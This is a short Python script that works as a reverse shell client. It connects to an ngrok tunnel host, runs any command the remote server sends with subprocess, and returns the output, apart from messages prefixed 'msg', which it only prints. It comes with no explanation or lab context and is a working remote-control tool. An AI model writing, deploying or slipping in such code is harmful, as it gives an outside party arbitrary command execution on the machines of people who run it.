from socket import *
import subprocess

IP = '4.tcp.ngrok.io'
PORT = 18663

conn = socket(2, 1)
conn.connect((IP, PORT))
print(f"Connected to Server {IP}:{PORT}")

while True:
    data = conn.recv(123456789).decode()
    dataSplit = data.split(" ")
    if dataSplit[0] == "msg":
        print(f"[Message from Server]: {data.replace(dataSplit[0], '')}")
    else:
        result = subprocess.getoutput(data)
        conn.send(result.encode())

conn.close()